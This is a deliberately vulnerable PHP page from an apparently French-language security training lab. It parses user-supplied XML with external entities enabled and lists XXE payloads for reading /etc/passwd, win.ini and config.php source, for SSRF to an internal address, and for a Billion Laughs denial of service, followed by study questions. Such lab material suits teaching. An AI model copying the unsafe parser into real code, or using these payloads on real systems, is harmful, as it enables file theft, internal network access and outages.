<?php
/**
 * PARTIE G - XXE (XML External Entity) VULNERABLE
 * 
 * [ATTENTION] CE CODE EST VOLONTAIREMENT VULNERABLE - NE PAS UTILISER EN PRODUCTION
 * 
 * Failles presentes :
 * - Parsing XML avec entits externes actives
 * - Lecture de fichiers systeme possible
 * - SSRF possible
 */

require_once __DIR__ . '/../init.php';
require_once __DIR__ . '/../functions.php';
include __DIR__ . '/../templates/header.php';

$message = '';
$result = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xml_data'])) {
    $xml_data = $_POST['xml_data'];
    
    // [VULNERABLE] VULNERABLE : Entits externes XML non desactivees
    // libxml_disable_entity_loader(false) est le comportement par dfaut sur anciennes versions
    
    $doc = new DOMDocument();
    $doc->loadXML($xml_data, LIBXML_NOENT | LIBXML_DTDLOAD);
    // [VULNERABLE] LIBXML_NOENT : Substitue les entits (permet XXE)
    // [VULNERABLE] LIBXML_DTDLOAD : Charge la DTD externe
    
    $result = $doc->textContent;
    $message = '<div class="alert alert-success">XML pars avec succs !</div>';
}

// Exemple XML pour les tests
$exemple_xml = '<?xml version="1.0" encoding="UTF-8"?>
<membre>
    <nom>Jean Dupont</nom>
    <email>jean@exemple.com</email>
    <activite>Football</activite>
</membre>';

$xxe_payload = '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<membre>
    <nom>&xxe;</nom>
    <email>test@test.com</email>
</membre>';
?>

<h2> Partie G - Faille XXE (XML External Entity)</h2>

<div class="danger-box">
    <strong>[VULN] VERSION VULNERABLE</strong><br>
    Le parsing XML autorise les entits externes. Lecture de fichiers systeme possible !
</div>

<?= $message ?>

<h3>Parser XML (vulnerable)</h3>
<form method="POST">
    <label for="xml_data">Donnes XML :</label>
    <textarea name="xml_data" id="xml_data" rows="10"><?= htmlspecialchars($exemple_xml) ?></textarea>
    
    <button type="submit"> Parser XML</button>
</form>

<?php if ($result): ?>
    <h3>Resultat du parsing</h3>
    <div class="code-block">
        <?= htmlspecialchars($result) ?>
    </div>
<?php endif; ?>

<h3> Exploitation XXE</h3>

<h4>1. Lecture de fichier local (/etc/passwd sur Linux)</h4>
<div class="code-block">
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;membre&gt;
    &lt;nom&gt;&amp;xxe;&lt;/nom&gt;
&lt;/membre&gt;
</div>

<h4>2. Lecture de fichier Windows</h4>
<div class="code-block">
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [
    &lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"&gt;
]&gt;
&lt;membre&gt;
    &lt;nom&gt;&amp;xxe;&lt;/nom&gt;
&lt;/membre&gt;
</div>

<h4>3. Lecture de code source PHP</h4>
<div class="code-block">
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [
    &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=../config.php"&gt;
]&gt;
&lt;membre&gt;
    &lt;nom&gt;&amp;xxe;&lt;/nom&gt;
&lt;/membre&gt;
</div>

<h4>4. SSRF (Server-Side Request Forgery)</h4>
<div class="code-block">
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [
    &lt;!ENTITY xxe SYSTEM "http://192.168.1.1/admin"&gt;
]&gt;
&lt;membre&gt;
    &lt;nom&gt;&amp;xxe;&lt;/nom&gt;
&lt;/membre&gt;
</div>

<h4>5. Dni de service (Billion Laughs Attack)</h4>
<div class="code-block">
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE lolz [
  &lt;!ENTITY lol "lol"&gt;
  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
  ...
]&gt;
&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
</div>

<h3> Questions</h3>
<ol>
    <li>Qu'est-ce qu'une entit XML externe ?</li>
    <li>Quels types de fichiers un attaquant peut-il lire via XXE ?</li>
    <li>Comement desactiver le parsing des entits externes en PHP ?</li>
    <li>Pourquoi l'attaque "Billion Laughs" provoque-t-elle un dni de service ?</li>
</ol>

<p><a href="../secure/parse_secure_xml.php"> Voir la version securisee</a></p>

    </main>\r\n</div>\r\n</body>\r\n</html>
